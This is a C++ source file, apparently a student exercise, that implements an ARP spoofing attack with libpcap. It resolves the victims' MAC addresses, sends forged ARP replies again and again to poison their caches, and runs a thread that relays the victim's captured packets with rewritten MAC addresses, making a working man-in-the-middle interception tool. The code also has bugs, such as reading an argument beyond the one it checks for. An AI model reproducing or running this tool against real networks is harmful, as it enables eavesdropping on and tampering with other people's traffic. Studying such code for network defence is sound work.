#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <thread>
#include <mutex>
#include <iostream>
using namespace std;


#pragma pack(1)

mutex m;

typedef struct {
	uint8_t des_mac[6];
	uint8_t src_mac[6];
	uint16_t type;
}Ethernet;
typedef struct{
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint32_t sender_ip;
	uint8_t target_mac[6];
	uint32_t target_ip;
}Arp_header;

typedef struct{
	Ethernet ethernet;
	Arp_header arp_header;
}arp;
char *dev;


void getmac(arp *arp_p){
	struct ifreq ifr;
	int sock = socket(AF_INET,SOCK_STREAM,0);

	strcpy(ifr.ifr_name,dev);
	ioctl(sock,SIOCGIFHWADDR, &ifr);
	unsigned char* mac = (unsigned char *)malloc(100);

	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	memcpy(arp_p->ethernet.src_mac,mac,sizeof(uint8_t)*6);

}

void arp_request(arp *arp_p,uint32_t src,uint32_t des){
	memset(arp_p->ethernet.des_mac,0xff,sizeof(uint8_t)*6);
	arp_p->ethernet.type = htons(0x806);
	arp_p->arp_header.hardware_type=htons(0x0001);
	arp_p->arp_header.protocol_type=htons(0x800);
	arp_p->arp_header.hardware_size=6;
	arp_p->arp_header.protocol_size=4;
	arp_p->arp_header.opcode =htons(0x0001);
	memcpy(arp_p->arp_header.sender_mac,arp_p->ethernet.src_mac,sizeof(uint8_t)*6);
	
	arp_p->arp_header.sender_ip = src;
	memset(arp_p->arp_header.target_mac,0x00,sizeof(uint8_t)*6);
	arp_p->arp_header.target_ip = des;
}



void usage(){
	printf("syntax : arp_spoofing <interface><sender ip><target ip>[<sender ip> <target ip> ...]\n");
}


void arp_attack_2(arp *arp_g,uint32_t sender, uint32_t target){
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ,1, 100,errbuf);
	if(handle == NULL){
		fprintf(stderr,"couldn't open device %s: %s\n",dev, errbuf);
		return ;
	}
	getmac(arp_g);
	uint32_t gateway_ip =0x01ffffff;
	gateway_ip &= target;
				
	arp_request(arp_g, sender,target);
	if(pcap_sendpacket(handle,(const u_char*)arp_g,42)==-1){
		printf("error");
	}else{
		printf("success");
	}
	while(1){
		struct pcap_pkthdr *header;
		const u_char *acq_packet;
		int res = pcap_next_ex(handle, &header, &acq_packet);
		if(res==0) continue;
		if(res==-1||res==-2) break;
		uint32_t t = 0x012ba8c0;


		if(acq_packet[12] == 0x8&&acq_packet[13]==0x06){
			if(acq_packet[20]==0x00 && acq_packet[21]==0x02){
				memcpy(arp_g->ethernet.des_mac,&acq_packet[22],sizeof(uint8_t)*6);
				memcpy(arp_g->arp_header.target_mac,arp_g->ethernet.des_mac,sizeof(uint8_t)*6);
				
				arp_g->arp_header.opcode =htons(0x0002);
				arp_g->arp_header.sender_ip = sender;
				break;	

				}
			
			}

		}
	//printf("%x",arp_g->ethernet.des_mac);
	int i=0;
/*	while(1){
	//m.lock();
	for(i=0;i<5;i++){
*/	if(pcap_sendpacket(handle,(const u_char*)arp_g,42)==-1){			
		printf("errer");
	}else{
		printf("send");
	}
/*	}
	//m.unlock();
	sleep(5);
    }
*/
}



void arp_attack(arp *arp_p,uint32_t sender, uint32_t target){
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ,1, 100,errbuf);
	if(handle == NULL){
		fprintf(stderr,"couldn't open device %s: %s\n",dev, errbuf);
		return ;
	}
	getmac( arp_p);
	arp_request(arp_p, sender,target);
	if(pcap_sendpacket(handle,(const u_char*)arp_p,42)==-1){
		printf("error");
	}else{
		printf("success");
	}
	while(1){
		struct pcap_pkthdr *header;
		const u_char *acq_packet;
		int res = pcap_next_ex(handle, &header, &acq_packet);
		if(res==0) continue;
		if(res==-1||res==-2) break;
	/*	char *t ;
		t =(char*)malloc((uint8_t)*4);
		sprintf(t,"%x",target);

	*/	if(acq_packet[12] == 0x8&&acq_packet[13]==0x06){
			if(acq_packet[20]==0x00 && acq_packet[21]==0x02){
				memcpy(arp_p->ethernet.des_mac,&acq_packet[22],sizeof(uint8_t)*6);
				memcpy(arp_p->arp_header.target_mac,arp_p->ethernet.des_mac,sizeof(uint8_t)*6);
				
					arp_p->arp_header.opcode =htons(0x0002);
					uint32_t gateway_ip =0x01ffffff;
					gateway_ip &= arp_p->arp_header.sender_ip;
					arp_p->arp_header.sender_ip = gateway_ip;
					break;	

				}
			
			}

		}
	int i=0;
	while(1){
	//m.lock();
	for(i=0;i<5;i++){
	if(pcap_sendpacket(handle,(const u_char*)arp_p,42)==-1){			
		printf("errer");
	}else{
		printf("send");
	}
	}
	sleep(3);
	//m.unlock();
    }

}

void v_to_g(arp *arp_g,arp *arp_p,uint32_t sender, uint32_t target){
 	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ,1, 100,errbuf);
        if(handle == NULL){
                fprintf(stderr,"couldn't open device %s: %s\n",dev, errbuf);
                return ;
        }
	while(1){
		//sleep(5);
		struct pcap_pkthdr *header;
		const u_char *acq_packet;
		//char *packet;	
		int res = pcap_next_ex(handle, &header, &acq_packet);
		if(res==0) continue;
		if(res==-1||res==-2) break;
		uint8_t packet[header->len];

		for(int i=0;i<header->len;i++){
			packet[i] = acq_packet[i];
		}
		/*uint8_t a[6];
		a[0] = 0x14;
		a[1] = 0x32;
		a[2] =0xd1;
		a[3] = 0x8a;
		a[4] = 0x81;
		a[5] =0x2b;*/
		uint32_t a=0;
		int kk;
		for(kk=0;kk<4;kk++){
			a<<=8;
			a |= packet[26+kk];
		}
		uint32_t a2 = ntohl(a);
		printf("\n%x\t%x\n", sender, a2);
		if(acq_packet[12] == 0x8&&acq_packet[13] ==0x6){
			continue;
		}else{
			if(sender == a2){
	//	memcpy(packet,a,sizeof(uint8_t)*6);
		memcpy(packet,arp_g->ethernet.des_mac,sizeof(uint8_t)*6);
		memcpy(&packet[6],arp_p->ethernet.src_mac,sizeof(uint8_t)*6);
		
		if(pcap_sendpacket(handle,(const u_char*)packet,header->len)==-1){			

			printf("error");
		}	else{
			printf("success");
		}

		}}
	}
			
			
			
}

int main(int argc, char* argv[]){
	struct in_addr in[4];
  	arp arp_p;
	arp arp_g;

	if(argc<4){
		usage();
		return 0;
	}
	int len = strlen(argv[1]);
	dev = (char *)malloc(len+1);
	inet_pton(AF_INET, argv[2],&in[0].s_addr);
	inet_pton(AF_INET, argv[3],&in[1].s_addr);
	inet_pton(AF_INET, argv[4],&in[2].s_addr);
	strcpy(dev,argv[1]);
	thread t2(&arp_attack_2,&arp_g,in[0].s_addr, in[2].s_addr);
	sleep(10);
	thread t(&arp_attack,&arp_p,in[0].s_addr, in[1].s_addr);
	sleep(20);
	thread t1(&v_to_g,&arp_g,&arp_p,in[1].s_addr,in[2].s_addr);

	t2.join();
//	sleep(100);
	t.join();
	t1.join();
	
	return 0;


}
		

